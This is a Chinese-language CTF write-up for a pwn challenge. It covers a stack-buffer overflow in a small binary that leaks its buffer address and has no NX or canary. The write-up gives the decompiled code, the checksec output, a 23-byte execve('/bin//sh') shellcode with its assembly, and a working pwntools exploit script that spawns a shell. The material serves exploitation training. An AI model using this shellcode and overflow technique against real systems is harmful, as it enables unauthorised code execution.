# 查看程序源码

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [sp+0h] [bp-10h]@1
  __int64 v5; // [sp+8h] [bp-8h]@1

  buf = 0LL;
  v5 = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to Sniperoj!");
  printf("Do your kown what is it : [%p] ?\n", &buf, 0LL, 0LL);
  puts("Now give me your answer : ");
  read(0, &buf, 0x40uLL);
  return 0;
}
```

 可以发现，程序中有一个栈溢出的漏洞，并且还给了对应的buf的地址。

# 检测程序的安全机制

```text
Canary                        : No
NX                            : No
PIE                           : Yes
Fortify                       : No
RelRO                         : Partial
```

可以看到程序中并没有设置堆栈执行保护。所以我们可以直接布置shellcode，然后跳转执行。

# 布置shellcode

通过

```C
  __int64 buf; // [sp+0h] [bp-10h]@1
  read(0, &buf, 0x40uLL);
```

可以知道buf相对于ebp的偏移为0x10,所以其可用的shellcode空间为16+8=24。我找了到了一个长度为23的shellcode。但是其本身是有push指令的，这时候如果我们把shellcode放在最前面，在程序leave的时候，在执行这些就会被覆盖。

```text
# char *const argv[]
xorl %esi, %esi
# 'h' 's' '/' '/' 'n' 'i' 'b' '/'
movq $0x68732f2f6e69622f, %rbx
# for '\x00'
pushq %rsi
pushq %rbx
pushq %rsp
# const char *filename
popq %rdi
# __NR_execve 59
pushq $59
popq %rax
# char *const envp[]
xorl %edx, %edx
syscall

shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```

所以我把它放在后面，payload为

```
'b'*24+[buf_addr+32]+shellcode_x64
```

# exp

```python
from pwn import *
from LibcSearcher import *
code = ELF('./shellcode')
if args['REMOTE']:
    sh = remote(111, 111)
else:
    sh = process('./shellcode')

# 23 bytes
# https://www.exploit-db.com/exploits/36858/
shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
sh.recvuntil('[')
buf_addr = sh.recvuntil(']', drop=True)
buf_addr = int(buf_addr, 16)
payload = 'b' * 24 + p64(buf_addr + 32) + shellcode_x64
print payload
#gdb.attach(sh)
sh.sendline(payload)
sh.interactive()
```

